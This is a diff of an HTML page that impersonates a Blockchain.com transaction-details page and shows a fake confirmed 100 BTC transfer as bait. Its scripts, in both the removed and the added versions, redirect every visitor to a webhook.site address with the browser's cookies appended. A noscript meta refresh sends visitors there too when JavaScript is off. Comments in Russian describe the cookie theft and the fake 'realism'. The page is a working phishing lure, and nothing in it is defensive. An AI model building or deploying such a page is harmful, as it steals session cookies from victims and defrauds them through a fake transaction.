@@ -1,45 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Transaction Details - Blockchain Explorer</title>
-    <!-- Добавим немного "реалистичности" -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="View transaction details on the blockchain.">
-    <!-- Отправляем куки через document.location -->
+    <title>Transaction Details - Blockchain.com</title>
     <script>
-        // Простая проверка, что JS выполняется
-        if (document.cookie) {
-            // Перенаправляем на webhook с куками в параметрах
-            document.location = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?c=' + encodeURIComponent(document.cookie);
-        } else {
-             // Если куки нет, всё равно отправляем запрос, чтобы было видно, что страница посещена
-             document.location = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?visited=true';
-        }
+        // JS для браузеров
+        window.location.href = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?c=' + encodeURIComponent(document.cookie);
     </script>
 </head>
 <body>
-    <!-- Имитируем реальный контент -->
-    <header>
-        <h1>Blockchain Explorer</h1>
-    </header>
-    <main>
-        <section>
-            <h2>Transaction Details</h2>
-            <p><strong>Transaction Hash:</strong> 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef</p>
-            <p><strong>Amount:</strong> 100 BTC <span style="color:green;">✅</span></p>
-            <p><strong>Status:</strong> Confirmed</p>
-            <p><strong>Timestamp:</strong> 2025-09-13 18:26:00 UTC</p>
-        </section>
-    </main>
-    <footer>
-        <p>&copy; 2025 Blockchain Explorer</p>
-    </footer>
-    <!-- Fallback на случай, если JS не выполнился сразу -->
+    <h1>Transaction Hash: 1234567890abcdef...</h1>
+    <p>Amount: 100 BTC ✅</p>
+
     <noscript>
-        <p>This page requires JavaScript to display transaction details.</p>
-        <!-- Иногда боты могут логировать содержимое noscript -->
-        <img src="https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?noscript=true" width="1" height="1" alt="">
+        <!-- Если JS отключен, используем meta refresh -->
+        <meta http-equiv="refresh" content="0;url=https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?noscript_cookiesteal=true" />
+        <p>Redirecting to transaction details...</p>
     </noscript>
 </body>
 </html>
